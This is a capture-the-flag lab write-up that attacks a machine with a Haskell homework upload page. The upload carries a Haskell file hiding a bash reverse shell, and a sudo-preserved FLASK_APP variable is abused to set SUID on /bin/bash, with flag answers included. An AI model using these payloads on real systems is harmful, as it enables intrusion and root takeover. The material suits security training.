# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 5001 | HTTP |



# RECONNAISSANCE
---


We can begin by visiting the web application:

![Pasted image 20250404151817.png](../../IMAGES/Pasted%20image%2020250404151817.png)


If we go to the homework section, we can see the following:


![Pasted image 20250404152029.png](../../IMAGES/Pasted%20image%2020250404152029.png)

We can go to the link and it will take us here:

![Pasted image 20250404152050.png](../../IMAGES/Pasted%20image%2020250404152050.png)

If we fuzz, we can find the submit directory in which we can upload a `haskell` file:


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.110.142:5001/FUZZ" -ic -c -t 200\

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.110.142:5001/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
submit [Status: 200, Size: 237, Words: 48, Lines: 9, Duration: 655ms]

```


A Haskell file (with the`.hs` extension) is a text file containing code written in the Haskell programming language, a purely functional, statically typed language. These files are used to define functions, data types, and program logic. When compiled or interpreted, the code is executed to perform tasks.

Based on that, we can begin exploitation.


# EXPLOITATION
---


Ok, if we read the homework section, we can find the indications on how to upload the Haskell file:

```
1) A function called "fib" that outputs the Fibonacci sequence. I will be checking for the first 100 numbers formatted as "1 1 3 ...".

2) A function called "range" that takes 2 numbers and returns a flat list containing all the integers in that range. Example: range 1 5 outputs [1,2,3,4,5]

3) A function called "grey" that takes a number as input and returns all of the codes for that n-bit number. Ex: grey 3 outputs ['000','001','011','010',110,111,101,100]. You can find more information about grey codes here: https://en.wikipedia.org/wiki/Gray_code" 
```


Nice, if we follow the instructions, we can create a payload to receive a reverse shell:

```haskell
module Main where

import System.Process

-- Homework functions (required to pass checks)
fib :: Int -> Int -> [Int]
fib a b = take 100 $ a : b : zipWith (+) (fib a b) (tail (fib a b))

range :: Int -> Int -> [Int]
range x y = [x..y]

grey :: Int -> [String]
grey n
 | n <= 0 = [""]
 | otherwise = map ('0':) prev ++ map ('1':) (reverse prev)
 where prev = grey (n-1)

-- Reverse shell payload (adjust IP/PORT)
main :: IO ()
main = callCommand "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
```

If we upload the file, and set up our listener, we can see the following:

![Pasted image 20250404152827.png](../../IMAGES/Pasted%20image%2020250404152827.png)

There we go, we got our shell. Let's start privilege escalation.




# PRIVILEGE ESCALATION
---


Let's begin by stabilizing the shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We can read user.txt now:

```
flask@haskhell:/home/prof$ cat user.txt
flag{academic_dishonesty}
```

We can grab the `id_rsa` from `prof` and log into ssh:

![Pasted image 20250404153210.png](../../IMAGES/Pasted%20image%2020250404153210.png)


If we check our sudo privileges, we can notice this:

```
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
 env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
 (root) NOPASSWD: /usr/bin/flask run
```

Let's read the script:

```python
prof@haskhell:~$ cat /usr/bin/flask

#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'Flask==0.12.2','console_scripts','flask'
__requires__ = 'Flask==0.12.2'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
 sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
 sys.exit(
 load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
 )
```


- The`FLASK_APP` environment variable is preserved due to`env_keep` in the sudoers configuration. 
- By pointing`FLASK_APP` to a malicious script, Flask executes it as root when`sudo flask run` is called.
- This bypasses restrictions because the script runs in the context of the Flask process (owned by root).

So, we can do the following:

1. Create a malicious file with the following contents:

```python
import os
os.system('chmod u+s /bin/bash') # Set SUID bit on /bin/bash
```

2, Set the environment variable:

```
export FLASK_APP=exploit.py
```

3. Run flask as root:

```
sudo /usr/bin/flask run
```

We can see the following:

![Pasted image 20250404154306.png](../../IMAGES/Pasted%20image%2020250404154306.png)

There we go, we got our root shell and can finally read `root.txt`:

```
bash-4.4# cat /root/root.txt
flag{im_purely_functional}
```

![Pasted image 20250404154405.png](../../IMAGES/Pasted%20image%2020250404154405.png)

